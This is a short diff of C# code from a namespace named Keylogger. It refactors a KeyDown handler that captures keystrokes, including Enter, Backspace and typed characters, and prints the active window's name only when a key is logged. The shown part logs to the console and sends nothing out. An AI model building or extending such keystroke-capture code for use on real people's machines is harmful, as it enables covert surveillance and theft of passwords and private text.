@@ -17,24 +17,26 @@ namespace Keylogger
 
         public void KeyDown(CatcherEventArgs args)
         {
-            if (lastWindow != args.WindowName)
-            {
-                Console.WriteLine();
-                Console.WriteLine(string.Format("[{0}]", args.WindowName));
-                lastWindow = args.WindowName;
-            }
+            string output = "";
             if(args.Key == Keys.Enter)
             {
-                Console.WriteLine("[Enter]");
+                output = "[Enter]";
             }
             else if (args.Key == Keys.Back)
             {
-                Console.Write("[Back]");
+                output = "[Back]";
             }
             else if (!args.IsSystemKey)
-            { 
-                Console.Write(args.UnicodeValue);
+            {
+                output = args.UnicodeValue;
             }    
+            if(output != "" && args.WindowName != lastWindow)
+            {
+                Console.WriteLine();
+                Console.WriteLine("[{0}]", args.WindowName);
+                lastWindow = args.WindowName;
+            }
+            Console.Write(output);
         }
 
         public void KeyUp(CatcherEventArgs args)
